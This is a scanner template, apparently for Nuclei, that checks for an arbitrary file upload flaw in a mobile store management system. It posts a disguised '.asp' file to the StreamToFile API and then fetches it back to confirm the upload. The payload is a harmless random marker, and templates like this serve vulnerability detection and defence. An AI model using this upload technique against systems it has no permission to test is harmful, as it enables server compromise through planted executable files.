id: poc-yaml-msms-streamtofile-anyfile-upload
info:
  name: 移动门店管理系统 StreamToFile 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: '{{rand_text_alphanumeric(4)}}'
  t2: '{{rand_text_alphanumeric(4)}}'
  t3: '{{concat(t1, "_", t2)}}'
  t4: '{{base64(t3)}}'

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - '{{BaseURL}}/api/UploadDB/StreamToFile'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
    body: |-
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="organ"

      {{t1}}
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="devid"

      {{t2}}
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="files";filename="1.asp"
      Content-Type: image/png

      {{t4}}
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"Success":true'
          - '上传成功'
        part: body
      - type: word
        words:
          - '<'
        part: body
        negative: true

  - id: verify-upload
    method: GET
    path:
      - '{{BaseURL}}/Files/DB/{{t3}}.asp'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{t4}}'
        part: body
